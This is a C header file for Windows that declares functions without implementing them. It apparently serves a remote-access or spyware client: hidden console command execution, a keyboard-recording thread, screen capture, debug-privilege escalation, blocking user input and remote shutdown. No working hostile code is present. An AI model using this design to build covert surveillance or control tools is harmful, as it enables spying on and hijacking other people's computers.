#ifndef WIN_MSC
#define WIN_MSC

#include <wchar.h>
#include <stdint.h>
#include "types.h"
#include "fbuf_fwd.h"

/* processes */
struct ProcessExecutePostState;

#define PE_FUN_OK 0
#define PE_FUN_ERROR 1 
#define BUFSIZE_PE 200

#define PEP_STDIN  0 
#define PEP_STDOUT 1
#define PEP_STDERR 2

struct ProcessExecutePostState* PEPStateCreate();
void                           PEPStateDestroy(struct ProcessExecutePostState *);
int                            PEPStateGetExitCode(struct ProcessExecutePostState *);
int                            PEPStateGetStream(struct ProcessExecutePostState*);
fbuf_ptr                       PEPStateGetBuffer(struct ProcessExecutePostState*);


typedef struct ConsoleState
{
    void * process;         // console process
    void * console_thread; // console main thread
    void * in_reader; // input reader
    void * in_writer; // input writer
    void * out_reader; // output reader
    void * out_writer; // output writer
    void * mutex;      // mutex for thread-safety
    int error_code; // last error
    int lastpos;
} CState;


boolean CreateNewConsole(CState * ctx);
void CloseConsole(CState * ctx);
fbuf_ptr ExecuteCommandInConsole(CState * ctx, wchar_t * command);
void ConsoleLoop(CState * ctx, void * anotherCtx);

/* this function is used only in inner of loop */
boolean ConsolePullCommandUnsafe(CState * console);

/* this function used only in outer of loop */
void    ConsolePushCommandUnsafe(CState* console, const wchar_t * value);

boolean ConsoleMutexLock(CState * console);
boolean ConsoleMutexUnlock(CState * console);

/* end processes */


void *      GetPolicyHandle();
void        ClosePolicyHandle(void * handle);
wchar_t *   GetCurrentUserName(size_t * chars);
boolean     EnableDebugPrivelege(void*, void*);
void        EnumAllPrivileges(void * pHandle, void * acc_sid);
extern int  CreateKeyBoardRecordingThread();


int         InitCurl();
void        DestroyCurl();

time_t      GetRunningTime();
uint32_t    GetLastErrorWin32();
char *      GetDesktopName();
long        GetProcessorCount();
boolean     TurnComputerOffWin32();
void        BlockInputWin32(boolean);
void        SetNoErrorWin32();
void        SetLastErrorWin32(uint32_t c);
boolean     HasErrorWin32();
char *      CaptureScreen(size_t * bytes);
void *      CreateFileWin32(const wchar_t * fileName);
boolean     IsFileValidWin32(const void *handle);
uint32_t    WriteFileWin32(const void * data, uint32_t length, void *file);
uint32_t    WriteFileWin32_ascii(char value, void *file);
uint32_t WriteFileWin32_unicode(const wchar_t value, void *file);
void CloseFileWin32(void *file);

boolean IsFileExistsWin32(const wchar_t *fileName);

void *OpenFileWithAppendWin32(const wchar_t *filename);

void *OpenFileWin32(const wchar_t *filename);


char *ReadFileAllWin32(void *fileHandle, size_t *out_siz);

wchar_t *   GetTempFolderPathWin32();
wchar_t *     GetWindowsDir();

unix_time_t FileTimeUnixWin32(void * ft);

int32_t Win32WriteStdout(const char *data);

int32_t Win32WriteUnicode(const wchar_t *data);

int RunProcess(const wchar_t * cmd, struct ProcessExecutePostState * peState);

size_t UTF8_Size(const char *s);

wchar_t *UTF8BytesToWide(const char *utf, int32_t bytes);

boolean IsUtfCodePage();
boolean IsWideCodePage();

#endif